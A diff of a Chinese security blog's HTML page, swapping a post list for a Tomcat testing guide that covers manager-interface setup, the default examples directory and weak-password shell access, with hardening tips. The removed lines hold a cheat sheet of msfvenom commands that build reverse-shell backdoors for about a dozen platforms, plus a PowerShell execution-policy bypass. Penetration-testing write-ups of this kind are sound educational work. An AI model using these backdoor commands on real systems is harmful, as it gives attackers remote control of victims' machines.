@@ -1,8 +1,8 @@
 <html>
   <head>
-      <meta charset="UTF-8"/>
+    <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<title>Error404</title>
+<title>tomcat系测试指南 | Error404</title>
 <link rel="shortcut icon" href="https://jackstrom0904.github.io/favicon.ico?v=1585193539381">
 <link rel="stylesheet" href="https://jackstrom0904.github.io/styles/main.css">
 
@@ -17,13 +17,13 @@
 <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js" integrity="sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz" crossorigin="anonymous"></script>
 <script defer src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js" integrity="sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI" crossorigin="anonymous"
     onload="renderMathInElement(document.body);"></script>
-      <meta name="description" content="渗透、运维、咨询狗">
+    <meta name="description" content="tomcat系测试指南" />
+    <meta name="keywords" content="" />
   </head>
   <body>
     <div class="head-top-line"></div>
-    <div class="viewport">
-      <div class="header-box">
-        
+    <div class="header-box">
+      
 <div class=" gemini">
   <header class="header">
     <div class="blog-header" id="header">
@@ -97,13 +97,19 @@
 
   navToggle.addEventListener('click',navClick);  
 </script>
-      </div>
-      <div class="main-continer">
+    </div>
+    <div class="main-continer">
+      
+      <div class="section-layout gemini">
+        <div class="section-layout-wrapper">
+          
+<div class="sidebar">
+    <div class="sidebar-box right-motion" id="sidebar">
+      
+      
+      <div class="sidebar-body gemini" id="sidebar_body">
         
-        <div class="section-layout gemini">
-          <div class="section-layout-wrapper">
-            <div class="sidebar">
-    <div class="sidebar-wrapper">
+          <div class="sidebar-wrapper">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="https://jackstrom0904.github.io/images/avatar.png"/>
     <p class="site-author-name">Error404</p>
@@ -155,11 +161,88 @@
     </div>
   
 </div>
+        
+      </div>
+    </div>
 </div>
-            <div class="section-box">
-              <section class="section posts-expand slide-down-in">
-                
-  <article class="post-list-box post">
+<script>
+  const SIDEBAR_TITLE_ACTIVE = 'sidebar-title-active';
+  const SIDEBAR_BODY_ACTIVE = 'sidebar-body-active';
+  const SLIDE_UP_IN = 'slide-up-in';
+
+  let sidebar = document.querySelector('#sidebar'),
+  tocSideBar = document.querySelector('#tocSideBar'),
+  metaSideBar = document.querySelector('#metaSideBar'),
+  postToc = document.querySelector('#post_toc'),
+  postSiteMeta = document.querySelector('#post_side_meta'),
+  sidebarTitle = document.querySelector('.sidebar-title'),
+  sidebarBody = document.querySelector('#sidebar_body');
+
+  tocSideBar && tocSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  metaSideBar && metaSideBar.addEventListener('click', (e) => {
+    toggleSidebar(e);
+  });
+
+  function toggleSidebar(e) {
+    let currentTitle = document.querySelector("."+SIDEBAR_TITLE_ACTIVE);
+    if (currentTitle == e.srcElement) {
+      return ;
+    }
+    let current, showElement, hideElement;
+    if (e.srcElement == metaSideBar) {
+      showElement = postSiteMeta;
+      hideElement = postToc;
+    } else if (e.srcElement == tocSideBar){
+      showElement = postToc;
+      hideElement = postSiteMeta;
+    }
+    currentTitle.classList.remove(SIDEBAR_TITLE_ACTIVE);
+    e.srcElement.classList.add(SIDEBAR_TITLE_ACTIVE);
+
+    window.Velocity(hideElement, 'stop');
+    window.Velocity(hideElement, 'transition.slideUpOut', {
+      display: 'none',
+      duration: 200,
+      complete: function () {
+        window.Velocity(showElement, 'transition.slideDownIn', {
+          duration: 200
+        });
+      }
+    })
+    hideElement.classList.remove(SIDEBAR_BODY_ACTIVE);
+    showElement.classList.add(SIDEBAR_BODY_ACTIVE);
+  }
+
+  postToc.addEventListener('transitionend', function() {
+    this.classList.remove(SLIDE_UP_IN);
+  });
+
+  let limitTop = document.querySelector('#nav_ul').children.length * 42 + 162;
+  let hasFix = false;
+
+  if (!sidebarBody.classList.contains('muse')) {
+    window.addEventListener('scroll', function(e) {
+    if (document.body.scrollTop >= limitTop) {
+      if (!hasFix) {
+        sidebar.classList.add('sidebar-fixed');
+        hasFix = true;
+      }
+    } else {
+      if (hasFix) {
+        sidebar.classList.remove('sidebar-fixed');
+        hasFix = false;
+      }
+    }
+  });
+  }
+  
+</script>
+          <div class="section-box">
+            <div class="section post">
+              <div class="article-box">
     <header class="post-header">
   <h1 class="post-title">
     <a class="post-title-link" href="https://jackstrom0904.github.io/lMfKyRZ1D">
@@ -184,299 +267,71 @@
     </span>
   </div>
 </header>
-    <div class="post-body">
-      
-        
-          
-          
-        
-      
-      
-      <div class="post-button text-center">
-        <a class="btn" href="https://jackstrom0904.github.io/lMfKyRZ1D" rel="contents">
-          阅读全文 »
-        </a>
-      </div>
-      
-    </div>
-    
-  </article>
-
-  <article class="post-list-box post">
-    <header class="post-header">
-  <h1 class="post-title">
-    <a class="post-title-link" href="https://jackstrom0904.github.io/_zxYWzWWT">
-      MSF生成各类后门
-    </a>
-  </h1>
-  <div class="post-meta">
-    <span class="meta-item pc-show">
-      <i class="fa fa-calendar-o"></i>
-      <span>发布于</span>
-      <span>2020-03-24</span>
-    </span>
-    
-      <span class="meta-item">
-        <span class="post-meta-divider pc-show">|</span>
-        <i class="fa fa-folder-o"></i>
-        <span class="pc-show">分类于</span>
-        
-          
-            <a href="https://jackstrom0904.github.io/x4l8rqWJg">
-              <span>红蓝对抗</span>
-            </a>
-          
-        
-      </span>
-      <span class="post-meta-divider">|</span>
-    
-    <span class="meta-item">
-      <i class="fa fa-clock-o"></i>
-      <span>2分钟</span>
-    </span>
-    <span class="meta-item">
-      <span class="post-meta-divider">|</span>
-      <i class="fa fa-file-word-o"></i>
-      <span>203<span class="pc-show">字数</span></span>
-    </span>
-  </div>
-</header>
-    <div class="post-body">
-      
-        
-          
-          
-            <p>
-            
-          
-            <p>Windows<br>
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f exe &gt; shell.exe<br>
-Linux<br>
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f elf &gt; shell.elf<br>
-Mac<br>
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f macho &gt; shell.macho<br>
-PHP<br>
-msfvenom -p php/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.php<br>
-ASP<br>
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f asp &gt; shell.asp<br>
-JSP<br>
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.jsp<br>
-WAR<br>
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=127.0.0.1 LPORT=6666 -f war &gt; shell.war<br>
-Python<br>
-msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.py<br>
-Bash<br>
-msfvenom -p cmd/unix/reverse_bash LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.sh<br>
-Perl<br>
-msfvenom -p cmd/unix/reverse_perl LHOST=127.0.0.1 LPORT=6666 -f raw &gt; shell.pl<br>
-Powershell<br>
-msfvenom -p windows/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=6666 -f psh &gt; shell.ps1<br>
-powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
-
-            
-          
-        
-      
-      
-    </div>
-    
-  </article>
-
-  <article class="post-list-box post">
-    <header class="post-header">
-  <h1 class="post-title">
-    <a class="post-title-link" href="https://jackstrom0904.github.io/sFeAdmB8q">
-      CORS跨域资源共享漏洞
-    </a>
-  </h1>
-  <div class="post-meta">
-    <span class="meta-item pc-show">
-      <i class="fa fa-calendar-o"></i>
-      <span>发布于</span>
-      <span>2020-03-20</span>
-    </span>
-    
-      <span class="meta-item">
-        <span class="post-meta-divider pc-show">|</span>
-        <i class="fa fa-folder-o"></i>
-        <span class="pc-show">分类于</span>
-        
-          
-            <a href="https://jackstrom0904.github.io/shen-tou-ce-shi">
-              <span>渗透测试</span>
-            </a>
-          
-        
-      </span>
-      <span class="post-meta-divider">|</span>
-    
-    <span class="meta-item">
-      <i class="fa fa-clock-o"></i>
-      <span>1分钟</span>
-    </span>
-    <span class="meta-item">
-      <span class="post-meta-divider">|</span>
-      <i class="fa fa-file-word-o"></i>
-      <span>136<span class="pc-show">字数</span></span>
-    </span>
-  </div>
-</header>
-    <div class="post-body">
-      
-        
-          
-          
-        
-      
-      
-      <div class="post-button text-center">
-        <a class="btn" href="https://jackstrom0904.github.io/sFeAdmB8q" rel="contents">
-          阅读全文 »
-        </a>
-      </div>
-      
-    </div>
-    
-  </article>
-
-  <article class="post-list-box post">
-    <header class="post-header">
-  <h1 class="post-title">
-    <a class="post-title-link" href="https://jackstrom0904.github.io/JwBsDK_57">
-      资产收集之GoBy
-    </a>
-  </h1>
-  <div class="post-meta">
-    <span class="meta-item pc-show">
-      <i class="fa fa-calendar-o"></i>
-      <span>发布于</span>
-      <span>2020-03-01</span>
-    </span>
-    
-    <span class="meta-item">
-      <i class="fa fa-clock-o"></i>
-      <span>1分钟</span>
-    </span>
-    <span class="meta-item">
-      <span class="post-meta-divider">|</span>
-      <i class="fa fa-file-word-o"></i>
-      <span>9<span class="pc-show">字数</span></span>
-    </span>
-  </div>
-</header>
-    <div class="post-body">
-      
-        
-          
-          
-        
-      
-      
-      <div class="post-button text-center">
-        <a class="btn" href="https://jackstrom0904.github.io/JwBsDK_57" rel="contents">
-          阅读全文 »
-        </a>
-      </div>
-      
-    </div>
-    
-  </article>
-
-  <article class="post-list-box post">
-    <header class="post-header">
-  <h1 class="post-title">
-    <a class="post-title-link" href="https://jackstrom0904.github.io/xcvq_tqj9">
-      DLL劫持检测工具
-    </a>
-  </h1>
-  <div class="post-meta">
-    <span class="meta-item pc-show">
-      <i class="fa fa-calendar-o"></i>
-      <span>发布于</span>
-      <span>2020-03-01</span>
-    </span>
-    
-    <span class="meta-item">
-      <i class="fa fa-clock-o"></i>
-      <span>1分钟</span>
-    </span>
-    <span class="meta-item">
-      <span class="post-meta-divider">|</span>
-      <i class="fa fa-file-word-o"></i>
-      <span>9<span class="pc-show">字数</span></span>
-    </span>
-  </div>
-</header>
-    <div class="post-body">
-      
-        
-          
-          
-        
-      
-      
-      <div class="post-button text-center">
-        <a class="btn" href="https://jackstrom0904.github.io/xcvq_tqj9" rel="contents">
-          阅读全文 »
-        </a>
-      </div>
-      
-    </div>
-    
-  </article>
-  
-                
-                
-<div class="page">
-  <ul class="pagination-ul">
-    
-    
-      
-        <li class="pagination-li pagination-active">
-            <a href="/page/../">
-              1
-            </a>
-        </li>
-      
-        <li class="pagination-li ">
-            <a href="/page/2">
-              2
-            </a>
-        </li>
-      
-        <li class="pagination-li ">
-            <a href="/page/3">
-              3
-            </a>
-        </li>
-      
-        <li class="pagination-li ">
-            <a href="/page/4">
-              4
-            </a>
-        </li>
-      
-        <li class="pagination-li ">
-            <a href="/page/5">
-              5
-            </a>
-        </li>
-      
-    
-    
-      <li class="pagination-dir">
-        <a href="/page/2">
-          <i class="fa fa-angle-right"></i>
-        </a>
-      </li>
-    
-  </ul>
 </div>
-              </section>
+              <div class="post-body next-md-body" id="post_body">
+                <p>0x01 tomcat安装部署<br>
+[root@bogon /]# wget http://archive.apache.org/dist/tomcat/tomcat-8/v8.5.31/bin/apache-tomcat-8.5.31.tar.gz<br>
+[root@bogon /]# tar zxvf apache-tomcat-8.5.31.tar.gz<br>
+[root@bogon /]# pwd<br>
+/opt/tomcat/apache-tomcat-8.5.31/bin<br>
+[root@bogon bin]# ./startup.sh  #启动tomcat<br>
+[root@bogon bin]# ./shutdown.sh #关闭tomcat<br>
+<img src="https://jackstrom0904.github.io/post-images/1585191601116.png" alt="" loading="lazy"><br>
+0x02 开启tomcat-web管理接口<br>
+配置文件1：[root@bogon conf]# cat tomcat-users.xml 取消配置文件中用户名部分的注释即可：生产环境下课删除多于的用户、并且设置包含三类字符的大于10位的密码。<br>
+<img src="https://jackstrom0904.github.io/post-images/1585192014778.png" alt="" loading="lazy"><br>
+配置文件2：apache-tomcat-8.5.31/webapps/manager/META-INF<br>
+修改allow处的配置。生产环境建议用此处限制主机的访问<br>
+<img src="https://jackstrom0904.github.io/post-images/1585192036837.png" alt="" loading="lazy"><br>
+0x03 examples目录存在<br>
+默认情况下：该目录存在多个servlets 存在多个安全风险<br>
+http://192.168.1.106:8080/examples/servlets/servlet/CookieExample<br>
+<img src="https://jackstrom0904.github.io/post-images/1585192433879.png" alt="" loading="lazy"><br>
+加固方法：直接将webapps下的examples目录删除<br>
+0x04 Tomcat后台使用弱口令可getshell<br>
+http://192.168.1.106:8080/manager/html #管理页面地址<br>
+测试方法：python脚本or burp or msf<br>
+0x05 Tomcat后台使用弱口令可getshell<br>
+0x06 Tomcat后台使用弱口令可getshell</p>
+
+              </div>
+              <div class="post-footer">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      Error404
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://jackstrom0904.github.io/lMfKyRZ1D" title="tomcat系测试指南">tomcat系测试指南</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，转载请注明出处！
+    </li>
+  </ul>
+  <div class="tags">
+    
+  </div>
+  <div class="nav">
+    <div class="nav-prev">
+      
+    </div>
+    <div class="nav-next">
+      
+        <a class="nav-pc-next" href="https://jackstrom0904.github.io/_zxYWzWWT">MSF生成各类后门</a>
+        <a class="nav-mobile-next" href="https://jackstrom0904.github.io/_zxYWzWWT">下一篇</a>
+        <i class="fa fa-chevron-right"></i>
+      
+    </div>
+  </div>
+</div>
+              
             </div>
           </div>
         </div>
-        <div class="footer-box">
+      </div>
+      <div class="footer-box">
   <footer class="footer">
     <div class="copyright">
       © 2019-2020 <i class="fa fa-heart"></i> HsxyHao
@@ -601,7 +456,6 @@ powershell.exe -ExecutionPolicy Bypass -File shell.ps1</p>
   // 代码高亮
   hljs.initHighlightingOnLoad();
 </script>
-      </div>
     </div>
   </body>
   <script src="/media/js/motion.js"></script>
